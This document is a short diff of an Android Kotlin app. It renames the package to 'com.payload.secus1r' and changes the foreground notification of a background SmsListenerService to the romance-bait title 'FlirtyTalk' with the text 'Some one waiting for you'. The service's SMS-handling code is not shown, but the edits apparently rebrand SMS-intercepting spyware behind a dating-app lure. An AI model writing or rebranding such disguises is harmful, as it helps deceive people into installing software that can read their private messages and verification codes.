@@ -1,4 +1,4 @@
-package godrich.live
+package com.payload.secus1r
 
 //
 //import android.app.Notification
@@ -139,7 +139,7 @@ class SmsListenerService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "Sweet Heard",
+                "FlirtyTalk",
                 NotificationManager.IMPORTANCE_LOW
             )
             val manager = getSystemService(NotificationManager::class.java)
@@ -148,7 +148,8 @@ class SmsListenerService : Service() {
 
         // 🔹 Foreground Notification
         val notification: Notification = NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Sweet Heard")
+            .setContentTitle("" +
+                    "FlirtyTalk")
             .setContentText("Some one waiting for you 💋💝")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .build()
